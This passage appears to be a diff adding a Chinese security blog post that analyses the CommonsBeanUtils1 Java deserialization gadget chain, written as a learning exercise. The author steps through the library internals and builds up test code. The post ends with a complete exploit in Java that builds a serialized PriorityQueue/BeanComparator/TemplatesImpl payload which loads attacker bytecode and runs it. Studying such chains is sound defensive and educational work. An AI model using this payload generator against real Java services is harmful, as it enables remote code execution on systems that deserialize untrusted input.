@@ -1,0 +1,450 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CommonsBeanUtils1 | follycat&#39;blog</title>
+<link rel="shortcut icon" href="https://follycat.github.io//favicon.ico?v=1744681794955">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://follycat.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CommonsBeanUtils1 | follycat&#39;blog - Atom Feed" href="https://follycat.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="CommonsBeanUtils介绍
+CommonsBeanUtils是Apache Commons中的一个组件，主要用于处理JavaBean的操作。 它提供了一系列工具类和方法，帮助开发者动态地获取和设置JavaBean的属性，简化了编程..." />
+    <meta name="keywords" content="java反序列化学习" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://follycat.github.io/">
+  <img class="avatar" src="https://follycat.github.io//images/avatar.png?v=1744681794955" alt="">
+  </a>
+  <h1 class="site-title">
+    follycat&#39;blog
+  </h1>
+  <p class="site-description">
+    无聊ini
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CommonsBeanUtils1
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-03-19
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://follycat.github.io/tag/fjr66JdbXW/" class="post-tag">
+                  # java反序列化学习
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://follycat.github.io//post-images/commonsbeanutils1.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="commonsbeanutils介绍">CommonsBeanUtils介绍</h1>
+<p>CommonsBeanUtils是Apache Commons中的一个组件，主要用于处理JavaBean的操作。 它提供了一系列工具类和方法，帮助开发者动态地获取和设置JavaBean的属性，简化了编程工作‌</p>
+<p>首先是功能方面：</p>
+<ol>
+<li>属性操作：提供了PropertyUtiles类，可以动态的获取和设置javaBean的属性，例如<code>PropertyUtils.getProperty(object, &quot;property&quot;)</code>可以调用对象的getter方法，获取属性值‌。</li>
+<li>类型转化：提供类型转化工具，如ConvertUtils，可以将一种类型的对象转换成另一种类型。</li>
+<li>比较器：BeanComparator类实现了Comparator接口，用于在集合中对javaBean对象进行排序</li>
+</ol>
+<h1 id="javabean介绍">javaBean介绍</h1>
+<p>上面提到了javaBean对象，那么javaBean对象是什么呢？</p>
+<p>javaBean是一种java的软件组件模型， 它通过封装属性和方法成为具有某种功能或处理某个业务的对象。</p>
+<p>我理解起来就是，在一个public的java类中，有无参的构造函数，并且存在一个或者多个private的属性，而且提供了公开的get/set方法的类就是javaBean。也就是下面三个要素</p>
+<ol>
+<li>该java类是公共的并且具有无参构造函数</li>
+<li>存在一个或者多个私有的属性</li>
+<li>有公开的getter与setter方法。</li>
+</ol>
+<h1 id="使用commonsbeanutils进行调用javabean事例及源码调试">使用CommonsBeanUtils进行调用javaBean事例及源码调试</h1>
+<p>cat.java</p>
+<pre><code class="language-java">package org.example;
+
+public class cat {
+    private String name = &quot;follycat&quot;;
+    public cat(){}
+
+    public String getName(){
+        return name;
+    }
+}
+</code></pre>
+<p>main.java</p>
+<pre><code class="language-java">package org.example;
+
+import org.apache.commons.beanutils.PropertyUtils;
+
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+
+public class Main {
+    public static void main(String[] args) throws Throwable {
+        cat cat = new cat();
+        System.out.println(PropertyUtils.getProperty(cat,&quot;name&quot;));
+
+    }
+}
+</code></pre>
+<p>调用过后可以直接输出name的值，因为可以直接找到cat类中name的get方法。</p>
+<p>可以进行调试一下，来看commonsBeanUtils是怎么进行调用name类的get方法的。</p>
+<p>首先进入.getProperty，</p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742313675534-244a8628-e9a1-4d46-8d57-abfd1089ff66.png" alt="" loading="lazy"></figure>
+<p>现在可以看到参数bean是cat类，name参数还是name。</p>
+<p>然后继续步入，走到PropertyUitlsBean中的getProperty方法。</p>
+<p>主要是这一段</p>
+<pre><code class="language-java">        while (resolver.hasNested(name)) {
+            String next = resolver.next(name);
+            Object nestedBean = null;
+            if (bean instanceof Map) {
+                nestedBean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, next);
+            } else if (resolver.isMapped(next)) {
+                nestedBean = getMappedProperty(bean, next);
+            } else if (resolver.isIndexed(next)) {
+                nestedBean = getIndexedProperty(bean, next);
+            } else {
+                nestedBean = getSimpleProperty(bean, next);
+            }
+            if (nestedBean == null) {
+                throw new NestedNullException
+                        (&quot;Null property value for '&quot; + name +
+                        &quot;' on bean class '&quot; + bean.getClass() + &quot;'&quot;);
+            }
+            bean = nestedBean;
+            name = resolver.remove(name);
+        }
+
+        if (bean instanceof Map) {
+            bean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, name);
+        } else if (resolver.isMapped(name)) {
+            bean = getMappedProperty(bean, name);
+        } else if (resolver.isIndexed(name)) {
+            bean = getIndexedProperty(bean, name);
+        } else {
+            bean = getSimpleProperty(bean, name);
+        }
+        return bean;
+</code></pre>
+<p>调试之后可以发现while(resolver.hasNested(name))是直接为false的，没有进入while循环中，然后因为bean不为map，引索，以及映射的属性，于是就进入了getSimpleProperty中</p>
+<p>继续跟进到getSimpleProperty中，然后看到getPropertyDescriptor</p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742314873973-e5d079f1-265c-4d15-bf0a-d1a90da4538b.png" alt="" loading="lazy"></figure>
+<p>其实可以看到在invokeMethod之前的readMethod中已经被赋值为了getName。</p>
+<p>差不多是在这里</p>
+<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742316620888-26a03d55-6a75-4b22-b857-26b95937ae11.png" alt="" loading="lazy"></figure>
+<p>其中的<code>getPropertyDescriptors()</code> 方法用于获取类的所有属性的描述符。每个 <code>PropertyDescriptor</code> 提供了有关该属性的详细信息，包括其名称、getter 方法、setter 方法等。</p>
+<p>也就是这里的信息开始有了getName方法</p>
+<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742316714347-0acbbabc-e03e-4573-a2be-cbd02a8ab65e.png" alt="" loading="lazy"></figure>
+<p>然后返回到getDescriptor中对获取到的getName以及其他方法进行遍历，最后返回我们所需要的那个类。</p>
+<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317050891-8c833b80-9a69-493f-b6ab-59dc55f8ffea.png" alt="" loading="lazy"></figure>
+<p>最后在这里的InvokeMethod进行执行。</p>
+<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317251132-2942a8a7-31f3-441e-87e9-8473549f87fc.png" alt="" loading="lazy"></figure>
+<p>跟进之后可以看到</p>
+<figure data-type="image" tabindex="7"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317362994-78b5a371-037c-4a9c-a334-f5ff5080335a.png" alt="" loading="lazy"></figure>
+<p>最后返回的value就是执行后的getName的返回值了。</p>
+<figure data-type="image" tabindex="8"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317445064-6425e783-a3c4-4061-911a-8ce1ee84b00c.png" alt="" loading="lazy"></figure>
+<h1 id="链子分析">链子分析</h1>
+<h2 id="尾部">尾部</h2>
+<p>既然已经知道了CommonsBeanUtils是如何调用getter方法的，现在就可以利用他进行调用任意getter方法了。</p>
+<p>可以看到cc3的链子，这条链子之前我自己分析的时候只分析到了newTransformer方法，然后直接使用cc1中的InvokeTransformer的后半条链进行调用了他的newTransformer，这里可以继续往下面分析。</p>
+<p>现在如果有一个getter方法调用了TemplatesImpl的newTransform方法，我们就可以通过PropertyUtils.getProperty调用getter方法，然后使用动态加载 TemplatesImpl 字节码的方式进行攻击的。</p>
+<p>这个getter方法就是getOutputProperties，他就在newTransform的下面，并且他完全符合PropertyUtils.getProperty的调用方式。</p>
+<pre><code class="language-java">    public synchronized Properties getOutputProperties() {
+        try {
+            return newTransformer().getOutputProperties();
+        }
+        catch (TransformerConfigurationException e) {
+            return null;
+        }
+    }
+</code></pre>
+<p>所以这条链子的尾部就已经完成了，就是使用PropertyUtils.getProperty调用TemplatesImpl的getOutputProperties方法，然后进行动态字节码加载执行代码</p>
+<p>测试代码:</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.PropertyUtils;
+
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class CommonsBeanUtils1 {
+
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class tc=templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));
+    }
+
+}
+</code></pre>
+<p>成功弹出计算器。</p>
+<h2 id="中间与前半部分">中间与前半部分</h2>
+<p>现在就是要从PropertyUtils.getProperty出发，继续寻找调用了他的链子。</p>
+<p>可以找到BeanComparetor的compare方法，这里调用了PropertyUtils.getProperty</p>
+<figure data-type="image" tabindex="9"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742354792257-8b75a0fa-2f4f-4113-9f3e-2d239aa74ffa.png" alt="" loading="lazy"></figure>
+<p>测试代码</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
+
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CommonsBeanUtils1 {
+
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class tc=templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
+        beanComparator.compare(templates,templates);
+    }
+
+}
+</code></pre>
+<p>成功弹出计算器</p>
+<p>随后继续查找有谁调用了compare，看到<code>PriorityQueue</code> 这个类中的<code>siftDownUsingComparator()</code> 方法。这个方法调用了compare()</p>
+<p>其实这前半部分和cc4中的前半段是一样的。</p>
+<h1 id="exp">exp</h1>
+<pre><code class="language-java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CommonsBeanUtils1 {
+
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class tc=templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
+//        beanComparator.compare(templates,templates);
+
+
+        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer&lt;&gt;(1));
+
+        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);
+
+        priorityQueue.add(templates);
+        priorityQueue.add(2);
+        Class c = priorityQueue.getClass();
+        Field field = c.getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(priorityQueue,beanComparator);
+
+        serialize(priorityQueue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+
+    }
+
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#commonsbeanutils%E4%BB%8B%E7%BB%8D">CommonsBeanUtils介绍</a></li>
+<li><a href="#javabean%E4%BB%8B%E7%BB%8D">javaBean介绍</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8commonsbeanutils%E8%BF%9B%E8%A1%8C%E8%B0%83%E7%94%A8javabean%E4%BA%8B%E4%BE%8B%E5%8F%8A%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95">使用CommonsBeanUtils进行调用javaBean事例及源码调试</a></li>
+<li><a href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">链子分析</a>
+<ul>
+<li><a href="#%E5%B0%BE%E9%83%A8">尾部</a></li>
+<li><a href="#%E4%B8%AD%E9%97%B4%E4%B8%8E%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86">中间与前半部分</a></li>
+</ul>
+</li>
+<li><a href="#exp">exp</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://follycat.github.io/post/apache-hugegraph-jwt-token-mi-yao-ying-bian-ma-lou-dong-dai-ma-fen-xi-cve-2024-43441/">
+              <h3 class="post-title">
+                Apache HugeGraph JWT Token密钥硬编码漏洞代码分析(CVE-2024-43441)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://follycat.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
